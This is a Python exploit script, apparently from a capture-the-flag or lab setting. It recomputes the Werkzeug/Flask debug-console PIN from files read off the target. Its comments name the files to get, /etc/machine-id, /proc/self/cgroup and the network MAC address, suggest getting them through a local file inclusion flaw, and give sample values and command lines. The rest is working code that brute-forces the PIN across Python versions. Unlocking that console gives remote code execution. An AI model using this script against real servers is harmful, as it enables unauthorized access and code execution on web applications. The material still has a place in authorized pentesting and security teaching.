# Python script that will generate a PIN which allows you access to Werkzeug Debug Console /console.
# For this script to work you will need to find a way to get access to specific files within the system, most likely through a LFI.

# The files of interest are: 
# --  /etc/machine-id
#      00566233196142e9961b4ea12a2bdb29
# --  /proc/self/cgroup
#        12:perf_event:/
#        11:freezer:/
#        10:hugetlb:/
#        9:pids:/system.slice/blog.service               
#        8:blkio:/system.slice/blog.service
#        7:cpu,cpuacct:/system.slice/blog.service
#        6:net_cls,net_prio:/
#        5:devices:/system.slice/blog.service
#        4:cpuset:/
#        3:rdma:/
#        2:memory:/system.slice/blog.service
#        1:name=systemd:/system.slice/blog.service
#        0::/system.slice/blog.service
# --  /sys/class/net/INTERFACE_NAME/address 
#        00:50:56:ba:2b:71
#        If the MAC address is not present in this file, you might need to search other files such as /sys/class/net/ens160/address.
#        Once you get the MAC address you need to convert it to a decimal value.

# Usage:
# python3 exploit.py --machineid '00566233196142e9961b4ea12a2bdb29blog.service' --uuid 345052425073
#
# if /proc/self/cgroup is not included in the computation of the debug PIN, you can remove it from machine id
# python3 exploit.py --machineid '00566233196142e9961b4ea12a2bdb29' --uuid 345052425073


#!/usr/bin/python3

import argparse
import os
import getpass
import sys
import hashlib
import uuid
from itertools import chain

text_type = str

def get_pin(args):
        rv = None
        num = None
        username = args.username
        modname  = args.modname
        appname  = args.appname
        fname    = args.basefile
        probably_public_bits = [username,modname,appname,fname]
        private_bits = [args.uuid, args.machineid]
        h = hashlib.md5()
        for bit in chain(probably_public_bits, private_bits):
                if not bit:
                        continue
                if isinstance(bit, text_type):
                        bit = bit.encode('utf-8')
                h.update(bit)
        h.update(b'cookiesalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        # If we need to generate a pin we salt it a bit more so that we don't
        # end up with the same value and generate out 9 digits
        if num is None:
                h.update(b'pinsalt')
                num = ('%09d' % int(h.hexdigest(), 16))[:9]

        # Format the pincode in groups of digits for easier remembering if
        # we don't have a result yet.
        if rv is None:
                for group_size in 5, 4, 3:
                        if len(num) % group_size == 0:
                                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                          for x in range(0, len(num), group_size))
                                break
                else:
                        rv = num

        return rv

if __name__ == "__main__":
    versions = ["2.7", "3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8"]
    parser = argparse.ArgumentParser(description="tool to get the flask debug pin from system information")
    parser.add_argument("--username", required=False, default="www-data", help="The username of the user running the web server")
    parser.add_argument("--modname", required=False, default="flask.app", help="The module name (app.__module__ or app.__class__.__module__)")
    parser.add_argument("--appname", required=False, default="Flask", help="The app name (app.__name__ or app.__class__.__name__)")
    parser.add_argument("--basefile", required=False, help="The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))")
    parser.add_argument("--uuid", required=True, help="System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)")
    parser.add_argument("--machineid", required=True, help="System machine ID (/etc/machine-id or /proc/sys/kernel/random/boot_id)")

    args = parser.parse_args()
    if args.basefile is None:
        print("[!] App.py base path not provided, trying for most versions of python")
        for v in versions:
            args.basefile = f"/usr/local/lib/python{v}/dist-packages/flask/app.py"
            print(f"{v}: {get_pin(args)}")
    else:
        print(get_pin(args))
